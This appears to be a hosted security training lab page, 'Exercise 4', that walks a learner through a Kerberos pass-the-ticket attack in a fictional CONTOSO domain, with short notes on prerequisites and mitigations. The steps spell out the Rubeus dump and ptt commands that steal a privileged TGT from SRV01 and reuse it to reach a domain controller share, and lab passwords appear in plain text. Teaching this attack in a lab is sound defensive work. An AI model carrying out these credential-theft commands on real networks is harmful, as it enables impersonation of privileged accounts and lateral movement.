
Kerberos

rubeus.exe dump /user:katrina.mendoza.adm /service:krbtgt

rubeus.exe ptt /ticket:


Extract the TGT from the LSASS memory 
	▪ This requires the seDebugPrivilege 
	▪ Requires that the targeted identity has cached its credentials 
Inject the TGT into your current session 
	▪ Either locally, or later on other systems by exporting it to a file 
	▪ The “new” ticket is used to request new service tickets 
Does not trigger any failed authentication attempts

This is possible because the hash is in the memory Needed for Single Sign-On


Attack’s pre-requisites Protection - A victim is connected to the system, or a service is running under a user account - seDebugPrivilege, or LSASS memory dump 
Protection
- Healthy administration practices (do not connect to untrusted systems with privileged accounts, use RDP restricted mode or remote credential guard)

(ING) LAB 4 - Lateral movement

4 Hours Remaining

Instructions Resources Help  100%

## Exercise 4 - Perform a pass-the-ticket attack

In this exercise **Miss Red** will try to steal the TGT of a privileged account to impersonate his or her on other system without knowing her password.

### Task 1 - Prepare the environment

You will steal Katrina's ticket on **SRV01**. We first need make sure she is connected to **SRV01**. So let's do that.

1. Log on to **[DC02](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)**. Use the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\katrina.mendoza.adm`|
    |Password|`NeverTrustAny1!`|
    
    **⚠️ You need to connect with Katrina's account, not Vickie's.**
    
2. Right click on the Start menu ![2022menu.png](https://labondemand.blob.core.windows.net/content/lab127288/2022menu.png) and click on **Run**.
    
3. In the **Run** window type `mstsc.exe` and click **OK**.
    
4. In the **Remote Desktop Connection** window, in the **Computer** field type `SRV01` and click **Connect**. You should be prompted to enter a password, use this password `NeverTrustAny1!` and click **OK**.
    

**⚠️ Leave the session open!**

### Task 2 - Export tickets out of SRV01

Let's check if there is something yummy to steal (well, we know there is because we made sure Katrina's admin account is connected to SRV01).

1. We are still on **[CLI01](https://labclient.labondemand.com/Instructions/477566ac-67c8-4de5-9b37-b38f90b2bb87?rc=10#)** with the following credentials:
    
    |||
    |---|---|
    |Username|`CONTOSO\red`|
    |Password|`NeverTrustAny1!`|
    
2. You should still have a **Connie CMD** red prompt open. If that's not the case, we are going to get back one by right clicking on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png) and then clicking on **Windows Terminal (Admin)**. In the **Windows Terminal** window, run the following: `runas /user:connie.flores@contoso.com cmd.exe` and use the following password `NeverTrustAny1!`. Then run `color 4F & title Connie CMD` and `cd \Tools\PStools`.
    
3. In **Connie CMD** red prompt window, run `psexec.exe \\SRV01 cmd.exe -accepteula`
    
    ⌚ The might take a little while (about a minute).
    
4. If this is successful, the title of the window will be **\\SRV01: cmd.exe**. Run the following command `cd \Tools\Ghostpack` then run `rubeus.exe dump /user:katrina.mendoza.adm /service:krbtgt`
    
5. Copy the base64 output into your clipboard. ![bq7frbd6.png](https://labondemand.blob.core.windows.net/content/lab127288/bq7frbd6.png)
    
6. Right click on the Start menu ![11menu.png](https://labondemand.blob.core.windows.net/content/lab127288/11menu.png) and click **Run**. In the **Run** window, type `notepad.exe` and click **OK**.
    
7. In the **Notepad** window, paste the base64 value and save the file. Click **File** then **Save as** and in the **File name** field type `C:\Users\Public\tgt.txt` and click **Save**.
    
8. Exit the PSExec session by also running `exit`. It will look like this: ![EXIT1.png](https://labondemand.blob.core.windows.net/content/lab127288/EXIT1.png) Then after few seconds you get the prompt back (if it seems to take to long, hit **[Ctrl] + C** to speed up the termination).
    

### Task 3 - Inject stolen tickets into memory

1. Let's put the base64 ticket into your clipboard. In the **Windows Terminal** window, run `(Get-Content C:\Users\Public\tgt.txt) -join "" -replace " " | clip`.
    
    > **clip** is a command line tool that take the output of a command and save it to the clipboard.
    
2. In the **Windows Terminal** window, run `klist`. It should return a bunch of Kerberos ticket. The one for your current session. Note that all of them are for the **Client:** **red @ CONTOSO.COM**. Those tickets were obtains thanks to our TGT. You can see the TGT by running `klist tgt`. It should look like this: ![TGT1.png](https://labondemand.blob.core.windows.net/content/lab127288/TGT1.png)
    
3. In the same console, try to browse the C$ share of a domain controller, first run `cmd` and then run `dir \\DC01\C$`. You should get this error message: ![PTT0.png](https://labondemand.blob.core.windows.net/content/lab127288/PTT0.png)
    
4. Change the active directory by running `cd \Tools\Ghostpack` and then type but do not execute `rubeus.exe ptt /ticket:` then before hitting Enter, make sure you place your cursor on the terminal and do a right click anywhere in the console. This should paste the content of your clipboard in the console. Then hit **Enter**. It should look like this: ![v2nlpjjb.png](https://labondemand.blob.core.windows.net/content/lab127288/v2nlpjjb.png)
    
5. Still in the **Windows Terminal** window, run `klist`. All your tickets are gone and being replaced by the one you've stolen from SRV01.
    
6. In the same console, try again to browse the C$ share of a domain controller by running `dir \\DC01\C$`.
    

1. List all tickets by running `klist`. You now have three tickets: ![qshxoyi5.png](https://labondemand.blob.core.windows.net/content/lab127288/qshxoyi5.png)
    
    📝 What is the Session Key Type of the cifs/DC01 ticket?
    
    ❓ Does the Protected Users group protect Kerberos material like it does for NTLM? **Click here to see the answer**.
    
    - [](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
    

0% Tasks Complete

PreviousNext: Exercise 5 - Hijack...

Live Chat


